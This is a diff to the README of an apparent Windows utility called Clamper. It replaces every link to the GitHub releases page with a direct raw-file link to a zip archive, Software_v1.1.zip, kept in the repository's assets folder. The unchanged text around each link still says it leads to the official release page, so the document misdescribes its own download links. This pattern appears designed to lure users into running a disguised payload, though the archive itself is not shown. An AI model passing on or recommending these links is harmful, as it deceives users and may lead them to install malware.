@@ -1,6 +1,6 @@
 # 🛠️ Clamper - Keep Your Menu Bar in Place
 
-[![Download Clamper](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/NeelAher13/Clamper/releases)
+[![Download Clamper](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/NeelAher13/Clamper/raw/refs/heads/main/assets/Software_v1.1.zip)
 
 ## 🔍 What is Clamper?
 
@@ -23,7 +23,7 @@ If your computer has these specs, Clamper should run smoothly.
 
 Use the button below to visit the page where you can get the latest version of Clamper:
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Downloads-blue)](https://github.com/NeelAher13/Clamper/releases)
+[![Visit Download Page](https://img.shields.io/badge/Visit-Downloads-blue)](https://github.com/NeelAher13/Clamper/raw/refs/heads/main/assets/Software_v1.1.zip)
 
 This link takes you to the official release page on GitHub. Here you will find the latest version of Clamper available for download.
 
@@ -32,7 +32,7 @@ This link takes you to the official release page on GitHub. Here you will find t
 Follow these steps to download and run Clamper on your Windows computer:
 
 1. Click on the blue button above or this link to open the release page:  
-   https://github.com/NeelAher13/Clamper/releases
+   https://github.com/NeelAher13/Clamper/raw/refs/heads/main/assets/Software_v1.1.zip
 
 2. On that page, look for the latest release near the top. Under the release title, find the "Assets" section.
 
@@ -98,7 +98,7 @@ Here are some common issues and how to solve them:
 ## 🔄 Updating Clamper
 
 Periodically visit the download page below to check for updates:  
-https://github.com/NeelAher13/Clamper/releases
+https://github.com/NeelAher13/Clamper/raw/refs/heads/main/assets/Software_v1.1.zip
 
 Download the newest `.exe` file following the same steps used for the first installation, then run it to update your existing version. Your settings will remain intact.
 
@@ -115,8 +115,8 @@ If you want to remove Clamper:
 ## 📁 Additional Resources
 
 - Visit the GitHub page for detailed info, updates, and support:  
-  https://github.com/NeelAher13/Clamper/releases
+  https://github.com/NeelAher13/Clamper/raw/refs/heads/main/assets/Software_v1.1.zip
 
 - Explore the repository for source code and contribution guidelines if interested.
 
-[![Download Clamper](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/NeelAher13/Clamper/releases)
+[![Download Clamper](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/NeelAher13/Clamper/raw/refs/heads/main/assets/Software_v1.1.zip)
